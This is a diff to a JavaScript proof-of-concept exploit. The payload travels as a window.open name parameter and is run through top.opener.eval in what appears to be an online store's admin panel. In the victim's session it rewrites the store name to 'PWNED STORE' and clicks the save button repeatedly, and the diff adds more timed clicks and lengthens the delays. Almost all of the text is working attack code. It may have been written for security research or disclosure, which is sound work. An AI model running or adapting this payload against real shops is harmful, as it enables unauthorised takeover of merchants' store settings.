@@ -30,8 +30,7 @@
   // This payload string is passed as the name parameter to window.open
   payload =`
           pwn=\`
-          alert('The attacker can now run any code they want in the victim's store');
-
+        
           // Update the store name
           textarea = document.getElementById('SPE.StNTxt');
           textarea.value='PWNED STORE'
@@ -39,17 +38,25 @@
           textarea.dispatchEvent(event);
           document.querySelector('.btn.save-panel__btn-save.btn-primary.btn-medium').dispatchEvent(new MouseEvent("click",{bubbles: true, cancellable: true}));
   
-          setTimeout(()=>{
-          document.querySelector('.btn.save-panel__btn-save.btn-primary.btn-medium').dispatchEvent(new MouseEvent("click",{bubbles: true, cancellable: true}));
-         },1000);
+        setTimeout(()=>{
+            document.querySelector('.btn.save-panel__btn-save.btn-primary.btn-medium').dispatchEvent(new MouseEvent("click",{bubbles: true, cancellable: true}));
+        },1000);
+
+        setTimeout(()=>{
+            document.querySelector('.btn.save-panel__btn-save.btn-primary.btn-medium').dispatchEvent(new MouseEvent("click",{bubbles: true, cancellable: true}));
+        },2000);
+
+        setTimeout(()=>{
+            document.querySelector('.btn.save-panel__btn-save.btn-primary.btn-medium').dispatchEvent(new MouseEvent("click",{bubbles: true, cancellable: true}));
+        },3000);
   
-          //setTimeout(()=>{
-          //document.querySelector('.btn.save-panel__btn-save.btn-primary.btn-medium').dispatchEvent(new MouseEvent("click",{bubbles: true, cancellable: true}));
-          //document.body.innerHTML='<br><br><br><br><br>&nbsp;&nbsp;&nbsp;<h1 style=color:red>pwned your shop name changed to PWNED STORE</h1>'
-          //},2000);
+        setTimeout(()=>{
+            document.querySelector('.btn.save-panel__btn-save.btn-primary.btn-medium').dispatchEvent(new MouseEvent("click",{bubbles: true, cancellable: true}));
+            //document.body.innerHTML='<br><br><br><br><br>&nbsp;&nbsp;&nbsp;<h1 style=color:red>pwned your shop name changed to PWNED STORE</h1>'
+        },4000);
           \`
   
-  setTimeout(()=>{top.opener.eval(pwn);},4000);
+  setTimeout(()=>{top.opener.eval(pwn);},6000);
   //setTimeout(()=>{top.window.close()},5000);
   
   
